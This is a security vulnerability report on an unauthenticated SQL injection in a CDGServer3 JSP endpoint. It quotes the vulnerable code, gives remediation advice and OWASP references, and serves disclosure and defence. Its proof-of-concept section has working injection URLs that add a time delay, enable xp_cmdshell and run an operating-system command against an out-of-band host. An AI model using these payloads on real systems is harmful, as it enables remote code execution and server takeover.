

# ![image-20250316215657668](./assets/image-20250316215657668.png)Vulnerability Report

## Title: Unauthenticated SQLI Leading to Remote Code Execution (RCE)

### Summary:

A SQL injection vulnerability was discovered in the `getFileTypeList.jsp` endpoint, specifically in the `typename` parameter. This vulnerability allows an unauthenticated attacker to execute arbitrary code on the MSSQL server, potentially gaining full control over the server.

### Affected Endpoint:

`CDGServer3/parameter/getFileTypeList.jsp`

### Vulnerability Type:

RCE

### Vulnerable Code:

```jsp
<%
	FileTypeInfo info = new FileTypeInfo();
	FileTypeDao dao = new FileTypeDao();
	List list = new ArrayList();
	int currPage = RequestUtil.getIntParameter(request, "curpage", 1); //当前是第几页
	String typename = request.getParameter("typename");
	if (typename == null) {
		typename = "";
	}
	PageUtil pageutil = dao.getFileTypeList(typename, currPage);
	list = pageutil.getRecords();
	session.setAttribute("maxrowcount", "" + pageutil.getRecordNum());
	session.setAttribute("maxpage", ""
			+ (pageutil.getPageNum() != 0 ? pageutil.getPageNum() : 0));
	session.setAttribute("curpage", "" + currPage);
	int count = 0;
	if (list != null && list.size() > 0) {
		count = list.size();
	}
%>
```

### Proof of Concept (PoC):

1. Time-based SQL Injection:

   ```
   https://uri/CDGServer3/parameter/getFileTypeList.jsp?typename=1';WAITFOR DELAY '0:0:10'--
   ```

2. Enabling `xp_cmdshell`:

   ```
   https://uri/CDGServer3/parameter/getFileTypeList.jsp?typename=1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
   ```

3. Executing arbitrary command:

   ```
   https://uri/CDGServer3/parameter/getFileTypeList.jsp?typename=1';exec master..xp_cmdshell 'ping fewfiews.ipv6.1433.eu.org.'--
   ```

### Impact:

This vulnerability allows an attacker to execute arbitrary commands on the server, which can lead to:

- Complete server compromise.
- Data exfiltration.
- Denial of Service (DoS) by executing resource-intensive commands.
- Potential lateral movement within the internal network.

### Recommendation:

1. **Input Validation and Sanitization:** Ensure that all user inputs are properly sanitized and validated. Use prepared statements with parameterized queries to prevent SQL injection.
2. **Least Privilege Principle:** Ensure the database user has the least privileges necessary for the application to function.
3. **Disable Dangerous Features:** Disable features like `xp_cmdshell` unless absolutely necessary.
4. **Regular Security Audits:** Conduct regular security audits and code reviews to identify and fix vulnerabilities.

### Conclusion:

The RCE in the `getFileTypeList.jsp` endpoint poses a significant security risk. Immediate remediation steps should be taken to sanitize user inputs and secure the database against unauthorized access and code execution.

### References:

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Mitigation Techniques](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

